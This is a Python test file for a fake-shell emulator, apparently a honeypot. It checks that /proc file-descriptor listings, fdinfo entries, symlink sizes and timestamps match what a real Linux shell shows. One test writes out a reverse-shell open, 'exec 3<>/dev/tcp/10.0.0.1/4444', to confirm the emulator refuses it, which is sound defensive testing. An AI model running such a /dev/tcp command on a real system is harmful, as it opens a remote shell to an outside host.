#!/usr/bin/env python3
"""What files does this process have open, and does /proc agree?

The shell keeps a table of descriptors -- `exec 7</etc/passwd` puts one in
it -- and /proc is where anything else looks for the same list. They were
two lists, and /proc's was a fixed 0, 1, 2:

    exec 7</etc/passwd
    ls /proc/$$/fd            0  1  2
    cat /proc/$$/fdinfo/7     No such file or directory

The shell and the kernel's own view of the same process, disagreeing about
what it had open. /proc/<pid>/fdinfo existed as an empty directory, so
anything walking a process's open files -- which is most of what forensics
tooling does -- found nothing at all there, for any pid.

Half the ways of opening one did not reach the table either. The redirect
scanner left `3>file` alone for exec to open, because a descriptor above 2
belongs to exec's own table, and did not do the same on the input side:

    exec 9>/tmp/y        worked
    exec 7</etc/passwd   swallowed as an fd-0 redirect, opened nothing
    exec 3<>/tmp/x       same
    exec 7<&0            read as a file called "&0": No such file or directory

And the entries themselves were wrong in two ways every `ls -l` shows: the
symlinks reported size 0 where Linux reports 64 -- the one thing under
/proc that is not 0, measured beside a cwd and an exe that are -- and they
were stamped with the boot, so a bash started ten seconds ago had
descriptors dated six weeks back.
"""

import os
import re
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fakeshell as fs                                          # noqa: E402

PASS, FAIL = 0, 0
FAILURES = []


def check(name, ok, detail=""):
    global PASS, FAIL
    if ok:
        PASS += 1
    else:
        FAIL += 1
        FAILURES.append("%-58s %s" % (name, detail))


def sh():
    s = fs.Shell(fs.VFS())
    s.exec_mode = True
    return s


def R(cmd, s):
    s._err = []
    out = s.run(cmd)
    return out or "", "".join(s._err), s.last_rc


def fds(s):
    return R("ls /proc/%d/fd/" % s.shell_pid, s)[0].split()


def infos(s):
    return R("ls /proc/%d/fdinfo/" % s.shell_pid, s)[0].split()


# ---------------------------------------------------------------------------
# fd and fdinfo are one list
# ---------------------------------------------------------------------------
def t_fd_and_fdinfo_match():
    s = sh()
    check("a fresh shell has 0, 1 and 2", fds(s) == ["0", "1", "2"],
          str(fds(s)))
    check("fdinfo has the same three", infos(s) == fds(s),
          "%s vs %s" % (infos(s), fds(s)))
    for pid in (1, 701, s.shell_pid):
        a = R("ls /proc/%d/fd/" % pid, s)[0].split()
        b = R("ls /proc/%d/fdinfo/" % pid, s)[0].split()
        check("pid %d: fdinfo mirrors fd" % pid, a == b,
              "%s vs %s" % (a, b))
        check("pid %d has at least the three standard ones" % pid,
              set(["0", "1", "2"]) <= set(a), str(a))


def t_fdinfo_describes_the_file_behind_the_fd():
    s = sh()
    body = R("cat /proc/%d/fdinfo/0" % s.shell_pid, s)[0]
    for key in ("pos:", "flags:", "mnt_id:", "ino:"):
        check("fdinfo/0 has %s" % key, key in body, body[:60])
    check("every field is a number",
          all(l.split("\t")[-1].strip().isdigit()
              for l in body.splitlines() if "\t" in l), body[:60])
    R("exec 7</etc/passwd", s)
    ino = R("stat -c %i /etc/passwd", s)[0].strip()
    body = R("cat /proc/%d/fdinfo/7" % s.shell_pid, s)[0]
    check("fdinfo names the inode the file really has",
          "ino:\t%s" % ino in body, "%r wanted ino %s" % (body, ino))
    check("and stat -c %i on the link's target agrees",
          R("stat -Lc %%i /proc/%d/fd/7" % s.shell_pid, s)[0].strip() == ino,
          R("stat -Lc %%i /proc/%d/fd/7" % s.shell_pid, s)[0].strip())


# ---------------------------------------------------------------------------
# opening one, every way exec spells it
# ---------------------------------------------------------------------------
def t_exec_opens_on_the_input_side_too():
    for form, target in (("exec 7</etc/passwd", "/etc/passwd"),
                         ("exec 7< /etc/passwd", "/etc/passwd"),
                         ("exec 3<>/tmp/rw", "/tmp/rw"),
                         ("exec 9>/tmp/out", "/tmp/out")):
        s = sh()
        _o, err, rc = R(form, s)
        num = re.match(r"exec (\d+)", form).group(1)
        check("`%s` exits 0" % form, rc == 0, "rc=%s %s" % (rc, err[:40]))
        check("`%s` shows up in /proc" % form, num in fds(s),
              str(fds(s)))
        check("`%s` points at the file" % form,
              R("readlink /proc/%d/fd/%s" % (s.shell_pid, num), s)[0].strip()
              == target,
              R("readlink /proc/%d/fd/%s" % (s.shell_pid, num), s)[0].strip())
        check("`%s` has an fdinfo entry" % form, num in infos(s), str(infos(s)))


def t_dup_and_close():
    s = sh()
    R("exec 7</etc/passwd", s)
    R("exec 8<&7", s)
    check("a dup makes a second descriptor", "8" in fds(s), str(fds(s)))
    check("pointing at the same file",
          R("readlink /proc/%d/fd/8" % s.shell_pid, s)[0]
          == R("readlink /proc/%d/fd/7" % s.shell_pid, s)[0], "differs")
    R("exec 7<&-", s)
    check("closing one removes it", "7" not in fds(s), str(fds(s)))
    check("and its fdinfo with it", "7" not in infos(s), str(infos(s)))
    check("but leaves the dup alone", "8" in fds(s), str(fds(s)))
    s2 = sh()
    R("exec 7<&0", s2)
    check("duplicating stdin works", "7" in fds(s2), str(fds(s2)))
    check("and lands on the terminal",
          R("readlink /proc/%d/fd/7" % s2.shell_pid, s2)[0].strip()
          == R("tty", s2)[0].strip(),
          R("readlink /proc/%d/fd/7" % s2.shell_pid, s2)[0].strip())


# ---------------------------------------------------------------------------
# what ls -l says about them
# ---------------------------------------------------------------------------
def t_the_links_look_like_procfs_links():
    s = sh()
    out = R("ls -l /proc/%d/fd/" % s.shell_pid, s)[0]
    rows = [l for l in out.splitlines() if " -> " in l]
    check("ls -l lists them as symlinks", len(rows) == 3, str(len(rows)))
    for r in rows:
        f = r.split()
        check("size is 64, as procfs reports", f[4] == "64", r[:50])
        check("mode is an l with rwx for the owner", f[0] == "lrwx------",
              f[0])
    # ...and 64 is specific to fd: everything else under /proc is 0.
    for p in ("cwd", "exe", "root", "status", "cmdline"):
        got = R("stat -c %%s /proc/%d/%s" % (s.shell_pid, p), s)[0].strip()
        check("/proc/<pid>/%s is size 0" % p, got == "0", got)
    check("but fd/0 is 64",
          R("stat -c %%s /proc/%d/fd/0" % s.shell_pid, s)[0].strip() == "64",
          R("stat -c %%s /proc/%d/fd/0" % s.shell_pid, s)[0].strip())


def t_the_links_are_stamped_when_the_process_started():
    s = sh()
    line = R("stat -c %%Y /proc/%d/fd/0" % s.shell_pid, s)[0].strip()
    check("the fd link has an mtime", line.isdigit(), line)
    if not line.isdigit():
        return
    age = time.time() - int(line)
    check("it is this session, not the boot", age < 300, "%.0f s old" % age)
    boot = int(R("awk '/btime/{print $2}' /proc/stat", s)[0].strip() or 0)
    check("and not the boot timestamp", int(line) != boot,
          "%s == btime" % line)
    # A long-running daemon's descriptors are old, though.
    old = R("stat -c %Y /proc/701/fd/0", s)[0].strip()
    check("a daemon's are older than this shell's",
          old.isdigit() and int(old) < int(line), "%s vs %s" % (old, line))


# ---------------------------------------------------------------------------
# the standard three agree with everything else about the terminal
# ---------------------------------------------------------------------------
def t_the_standard_three_are_the_terminal():
    s = sh()
    tty = R("tty", s)[0].strip()
    check("tty names a pts", tty.startswith("/dev/pts/"), tty)
    for n in ("0", "1", "2"):
        check("fd %s is that terminal" % n,
              R("readlink /proc/%d/fd/%s" % (s.shell_pid, n), s)[0].strip()
              == tty,
              R("readlink /proc/%d/fd/%s" % (s.shell_pid, n), s)[0].strip())
    check("$SSH_TTY says the same", R("echo $SSH_TTY", s)[0].strip() == tty,
          R("echo $SSH_TTY", s)[0].strip())
    check("and /dev/stdin resolves there",
          R("readlink -f /dev/stdin", s)[0].strip() == tty,
          R("readlink -f /dev/stdin", s)[0].strip())
    # /proc/self is this shell, so its fd list is the shell's.
    check("/proc/self/fd is the shell's fd list",
          R("ls /proc/self/fd/", s)[0].split() == fds(s),
          R("ls /proc/self/fd/", s)[0].split())


def t_a_reverse_shell_open_is_still_refused():
    """The one thing this must never do is dial out."""
    s = sh()
    _o, err, rc = R("exec 3<>/dev/tcp/10.0.0.1/4444", s)
    check("a /dev/tcp open is refused", rc != 0 or "connect" in err,
          "rc=%s %r" % (rc, err[:50]))
    check("with a connection error", "Connection refused" in err, err[:60])
    check("and no descriptor is left behind", "3" not in fds(s), str(fds(s)))


TESTS = [t_fd_and_fdinfo_match,
         t_fdinfo_describes_the_file_behind_the_fd,
         t_exec_opens_on_the_input_side_too,
         t_dup_and_close,
         t_the_links_look_like_procfs_links,
         t_the_links_are_stamped_when_the_process_started,
         t_the_standard_three_are_the_terminal,
         t_a_reverse_shell_open_is_still_refused]


def main():
    for fn in TESTS:
        try:
            fn()
        except Exception as exc:                       # pragma: no cover
            check(fn.__name__ + " raised", False, repr(exc)[:90])
    for line in FAILURES:
        print("  FAIL " + line)
    print("passed %d, failed %d" % (PASS, FAIL))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
